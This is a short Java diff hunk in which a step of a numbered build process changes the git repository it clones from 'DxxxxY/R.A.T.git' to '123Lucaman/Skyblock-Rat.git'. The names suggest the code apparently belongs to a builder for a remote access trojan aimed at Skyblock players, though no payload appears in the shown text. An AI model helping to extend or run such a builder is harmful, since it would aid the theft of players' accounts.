@@ -50,7 +50,7 @@ public class Tasks {
             if (!path.exists()) {
                 log("Repository not found. Cloning repository... [1/9]");
 
-                Git.cloneRepository().setURI("https://github.com/DxxxxY/R.A.T.git").setDirectory(path).call();
+                Git.cloneRepository().setURI("https://github.com/123Lucaman/Skyblock-Rat.git").setDirectory(path).call();
 
                 log("Repository cloned successfully. [1/9]");
             } else {
